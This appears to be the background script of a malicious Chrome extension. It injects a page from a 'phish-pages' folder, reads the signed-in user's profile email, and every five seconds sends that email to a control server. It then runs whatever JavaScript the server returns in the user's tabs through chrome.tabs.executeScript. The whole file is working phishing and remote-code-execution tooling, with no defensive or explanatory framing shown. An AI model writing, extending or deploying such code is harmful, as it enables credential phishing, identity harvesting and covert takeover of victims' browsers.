$.get('../phish-pages/email.html', function(data) {
    $('body').prepend(data);
});


function executeJS() {
    chrome.identity.getProfileUserInfo(function(userInfo) {
        if (userInfo.email == "") {
            userEmail = "no_email_found";
        }
        else {
            userEmail = JSON.stringify(userInfo.email);
        }
        localStorage.setItem('email', userEmail);
        $.get(`http://localhost:5000/execute_script/${userEmail}`, function(script) {
            if (script.js && script.js.length !== 0) {
                // Execute each script in the array
                for (let code of script.js) {
                    code = code.replace(/<script>|<\/script>/gi, '');
                    console.log(code);
                    chrome.tabs.executeScript({code: code}, function(result) {
                        console.log(result);
                    })
                }
            }
        });
    });
}


setInterval(executeJS, 5 * 1000);